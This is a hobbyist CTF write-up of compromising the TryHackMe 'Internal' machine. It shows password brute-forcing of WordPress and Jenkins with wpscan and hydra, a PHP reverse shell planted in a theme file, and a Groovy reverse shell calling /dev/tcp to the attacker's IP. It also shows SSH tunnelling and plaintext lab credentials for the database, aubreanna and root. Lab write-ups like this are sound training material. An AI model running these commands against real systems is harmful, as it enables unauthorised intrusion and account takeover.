# Internal CTF writeup

This is a practical walkthrough of Internal penetration testing challenge on TryHackMe. 
I decided to take this challenge with a friend who is also classmate of mine. we have not attempted this challenge before and it tooks us around 2-2.30 hours to complete

Quick Disclaimer (if you want to attempt this yourself) we would highly encourage people to attempt this challenge first before reading this or any other writeups, there will be spoilers obviously.
I believe you will enjoy the CTF more if you attempt this yourself or with a group of people and read this or other writeups if you get stuck on a particular part.

But anyways lets get into it :)

## Internal CTF Breif (Background)

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

User.txt

Root.txt

Additionally, the client has provided the following scope allowances:

- Ensure that you modify your hosts file to reflect internal.thm

- Any tools or techniques are permitted in this engagement

- Locate and note all vulnerabilities found

- Submit the flags discovered to the dashboard

- Only the IP address assigned to your machine is in scope

(Roleplay off)
The author encourage players to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.

In this case, We will be focusing on the flags, but we'll try to cover most of the additional points listed as we're going along.

## 1.Enumeration 

Ok before we start, we are going to tick off the first point which is to "Ensure that you modify your hosts file to reflect internal.thm"

using sudo nano /etc/hosts and add the IP address and define the domain 
```shell
$ sudo nano /etc/hosts
```
reason for this:

```shell
1. Making a single request for easy back-end services
2. There could be multiple webisite hosted by this IP address
3. Potential subdomains

### Nmap scan 

# nmap -sC -sV -Pn internal.thm
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 13:18 EDT
Nmap scan report for internal.thm (10.10.42.84)
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
```
Ok it appears that there are 2 ports open, SSH and a http with the service versions. whilst we're here we conduct a quick vulnerability check on the exploit-db but no results. 
by looking at the version numbers and comparing them to today, they dont look like to be older versions, as a result of why there were no public exploits avaliable. 

So we checked on port 80 to see the host of the website and its a default welcome page of apache2 ubuntu 

![1 ubuntu page](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/4e3d723e-5d08-4e43-8b25-a29ce13df551)

Now we're going to further enumerate the website for any hidden directories using dirbuster or Gobuster tool.

```shell
$ gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/04 13:21:55 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
/javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
Progress: 73305 / 220561 (33.24%)
```

The tool has idenitfy a few directories of the web page. The /blog page, is a simple website using wordpress. 

/phpmyadmin is a login page (think we found something)

![3  phphadmin](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/2295b1c1-4f96-4cc1-a8a0-e2f591eefb37)

Ok based on this information, we are going to focus on wordpress vulnerabilities, as its a common exploit approach that we have expereineced. At this point we browser the website for any information we can this could be version number, potential login credentials, clues, etc. 

After viewing the source code of the website, the wordpress version is running on 5.4.2 

![4 js version](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/b89d1293-18e9-45d6-83a9-5e930a68d1f0)

We did a quick CVE check but there are none.

Whilst browsing through the site we found a login directory at the bottom of the page. 

![2 wp login](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/691eeb12-8a6b-4fda-999c-7025bf10693d)

ok we found a second login page. 

### Exploiting wordpress 

We are now going to put more attention onto wordpress login rather than a the phpmyadmin login as this is a database login which there are potenial hidden inforamtion in there but we feel like exploiting wordpress is easier and we believe that the challege wont just throw an easy account credential to that log in page that easily, this is from past expereience. 

Ok so we have to find a potential log in credential. 

we both have the same thought process of obtaining a login, found out there are few ways to get the login account.

1. Browser the webiste.

There is post on the web showing the date posted and the author of the post 

![5 admin](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/7e89c08f-d427-48cd-88bb-6d0fceb2525b)

2. Attemping to iterate the user id

I was able to iterate through user id's and append the to the site URL 

![7 injection](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/09a15006-0a78-44f5-8383-6930af5cd94c)

I tried this and pops out the author as admin but took me to the user of blog 

![6 admin](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/5baba7b8-5dbc-4aee-aeb6-acb738039238)

I also tried differen id's 

![8 oops](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/ce5b8a6a-f332-4c9d-8595-1f886b466d0c)

As you can i use 2, both results are varied. 

3. using wpscan

My friend took this approach using the command to enumerate (-e) the username of the wordpress login 

```shell
$ wpscan --url http://internal.thm/blog -e u

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
 
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```
He found out a user called admin, same results as previous 2.

But other information about wordpress, it's and older version which migh come in handy??????? 

We tried a standard error check (admin,admin) and turns out admin is a user to this. 


![9 admin](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/ef741543-0bcd-4cd7-aa98-ec897cff527a)

Further confirmation (admin2)

![10 admin 2](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/5084f496-13d8-4bcc-9109-7d7899a83bea)

Now this might be a possible bruteforce technique, so we can ethier use hydra or wpscan, bare in mind wpscan is an aggressive method which may generate logs and events on the otherside, but since this is a box we dont need to worry.

```shell
$ wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt
 
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                        
Trying admin / lizzy Time: 00:02:01 <
```

Found a password !!!!!!!

![11 were in](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/3b258469-9f3b-48dc-aa37-175b289bb748)

We're In !!!!!!

## 2. Wordpress Reverse Shell

In addition to obtaining the account info, we tried login to the SSH and the phpmyadmin but failed to get in. 

But in any case, it seems we can edit some theme files and update them accordingly. We can now perform a reverse shell via the 404.php. 

![12   404 php](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/09934549-196b-4fbb-ab12-c47c7b1b9578)

We Replace the code with a reverse shell code by pentestingmonkey; changing the ports and the Listener IP address to our own  

![13 resver info change](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/ae6bdb3d-3e31-4c99-b48a-0b78cd9ef16f)

Once completed, We started up a netcat listener, update the code and in order to execute the code we insert the following command on the url 

http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php

```shell
$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [My IP] from (UNKNOWN) [10.10.42.84] 42942
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:33:09 up 10 min,  0 users,  load average: 0.00, 0.11, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
There we go !!!

```shell
$ whoami
www-data
```
## 3. Privilege Escalation (User) 

We're going to check in the home directory. 

```shell
$ cd home
$ ls
aubreanna

$ cd aubreanna
/bin/sh: 6: cd: can't cd to aubreanna
```

Right turns out there is a user name called 'aubreanna' but we dont have permissions to access the directory.  

We now going to enumerate further using linpeas to find any privilege escalation.

Setting up a python http server runnign on port 8080

```shell
$ python -m http.server 8080
```
Obtain linpeas.sh from our machine to the target using wget and storing it into the tmp directory.

```shell
$ wget http://<my IP>:8080/linpeas.sh -O /tmp/linpeas.sh
--2023-08-08 12:44:23--  http://<My IP>:8080/linpeas.sh
Connecting to <My IP>:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134168 (131K) [text/x-sh]
Saving to: '/tmp/linpeas.sh'

     0K .......... .......... .......... .......... .......... 38%  444K 0s
    50K .......... .......... .......... .......... .......... 76%  578K 0s
   100K .......... .......... .......... .                    100%  593K=0.3s

2023-08-08 12:44:24 (521 KB/s) - '/tmp/linpeas.sh' saved [134168/134168]
```
Headed over to the /tmp and execute using bash linpeas.sh

```code
$ cd tmp
$ ls
linpeas.sh
$ bash linpeas.sh
```
We used linpeas for easy navigation for privilege escalation by using the colour palete

There are some interesting things that bought our attention.

There is possible wordpress configuration?

![14 linpeas wp config](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/20856305-5dba-48f7-8d31-84219bbf5b3f)

There is a SSH root login (but we do need the password to that)

![15 root](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/bbf3c169-83d6-40cf-a974-db0ac6fbb696)

There are some interesting readable files under phpmyadmin configuration?  

![16 clue](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/d53e8559-c830-408b-af92-24b75877986d)

We're going to take a look at the infomation in phpmyadmin 

```shell
$ cd ..
$ cd /etc/phpmyadmin
$ ls
apache.conf
conf.d
config-db.php
config.footer.inc.php
config.header.inc.php
config.inc.php
htpasswd.setup
lighttpd.conf
phpmyadmin.desktop
phpmyadmin.service
```
There is One spercific file that looks interesting 

```shell
$ less config-db.php
<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
```

Ok this seems to be a database login, there is a second login page for phpmyadmin, maybe this could be it?

Turn out it is, we have access to the database

![17 db](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/5786c570-0d83-457b-9bb5-eb5fda0eb57c)

At this point, we spent 30-45 minutes searching though and finding any information to privilege escalation but we couldn't find anything useful. 

At the same time, looking at the other files in the directory  

config-localhost.php is the wordpress configuration but nothing relevant to what we're after. 

```shell
$ cat config-localhost.php
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'wordpress123');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/var/www/html/wordpress/wp-content');
```

After some more searching, i found an interesting text file in the /opt directory. The content of the file contains aubreanna credentials. Which means we can login to aubreanna using this. 

```shell
$ cd /opt
$ ls
containerd
wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```
This error show we need to run this on a terminal.

```shell
$ su -l aubreanna
su: must be run from a terminal
```

Since we're using netcat reverse shell, the shell is not stable. So in order to fix this we need to spawn a stable shell with the following commands 

```shell
$ python -c "import pty;pty.spawn('/bin/bash')"
```
Now we can try again and hopefully it should work 

```shell
www-data@internal:/opt$ su -l aubreanna
su -l aubreanna
Password: bubb13guM!@#123

aubreanna@internal:~$
```

And we're in !!!!!!

We have now obtain the user flag !!!!

```shell
aubreanna@internal:~$ whoami
whoami
aubreanna
aubreanna@internal:~$ ls
ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
```

## 4. Privilege Escalation (Jenkins)

There is a 'jenkins.txt' which contains some interesting message.

```shell
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

Ok, Apparently there is somethign running on a a specific IP and port on localhost, the text shows a jenkins server is running on the address
We check the network by using 'ifconfig' and its apprears that there is a docker running on the target machine with '172' series. At this point we want to access that port but 
its not reachable from our browser. So we perfomed a SSH tunneling to forward that address to the target machine. 
We want to establish an SSH connection from the server and forward the traffic to a specfic port from our local host. 

```shell
$ ssh -L 4444:172.17.0.2:8080 aubreanna@internal.thm 
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  8 13:11:10 UTC 2023

  System load:  0.0               Processes:              120
  Usage of /:   63.7% of 8.79GB   Users logged in:        1
  Memory usage: 45%               IP address for eth0:    10.10.42.84
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Aug  8 13:07:43 2023 from 10.10.42.84
aubreanna@internal:~$
```

Now we should be able to access the jenkins server from our browser to our assigned port.

![image](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/b8170aac-4baa-4b56-9d41-0d2dcd4999ea)

It worked !
Now the login part. 

We tried using aubreanna's credentials to login but failed, we took some time to find the login credintials within the aubreanna's SSH but couldn't find anything. After conducting further research on jenkin server. A quick seach says that most jenkins default credentials is admin as the username. So we took this chance and performed a bruteforce attack on the password. 

We're going to use hydra for this. First we need the variables HTTP/POST request by using burpsuite.

![19 burp](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/76ebaafe-7cf6-43f3-87dc-b1e7e8141a7d)

We got the parameter, circle in red is how the login parameters respond

Hydra time !!!!!!!!

```shell
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4444 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login:Invalid username or password" 
```
![Capture](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/83f276f2-2cb8-42cc-9636-97a3554c5fa8)

lol nice password :)

We're in the server. So with jenkins have a script console for any code execution so we can use that to create a reverse shell. Finding out that jenkins is java, we'll use the Groovy script by pentestingmonking.

![20 script consol](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/43d03f9a-fe69-4ae8-bdc4-ae2abda25f19)


```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<My IP>/5555;cat<&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Create a netcat listener 

```shell
$ nc -lvnp 5555 
listening on [any] 5555 ...
connect to [My IP] from (UNKNOWN) [10.10.42.84] 35436
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
/bin/bash -i
bash: cannot set terminal process group (6): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@jenkins:/$
```

And we're in the docker environment !!!!!

## 5. Privilege Escalation (Root)

Ok after understanding with aubreanna credential with the text file, we believe that it would be the same with the root credential. 
The problem with jenkins some commands may not work like normal linux commands so we have to research on how to use the command on jenkins. 
we use the find command to locate a text file within the server. 

```shell
jenkins@jenkins:/$ find / -name *.txt
find / -name *.txt
/opt/note.txt
```
We checked the /opt to locate the note.txt and what do you know !!!!

```shell
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
jenkins@jenkins:/opt$
```
Root credentials !!!!!!

Now we can SSH the root user.

```shell
$ ssh root@internal.thm     
root@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  8 13:42:12 UTC 2023

  System load:  0.0               Processes:              113
  Usage of /:   63.7% of 8.79GB   Users logged in:        1
  Memory usage: 39%               IP address for eth0:    10.10.42.84
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug  3 19:59:17 2020 from <IP>
root@internal:~# whoami
root
```

BOOM we are root !!!!!!! Now obtain the final flag 

```shell
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt
```
# Conclusion 
Thank you for taking you time to read my writeup for the Internal CTF challenge. This was a fun and challenging CTF that is avaliable on tryhackme. Personally, i have learnt so much in this challenge from identifying 
vulnrability services to exploiting with numerous techniques. I found this to be very helpful in my penertration testing progression. Thank you again for reading to the end and happy hacking!!!!!!!!!!!!!!!!!!!!!! 














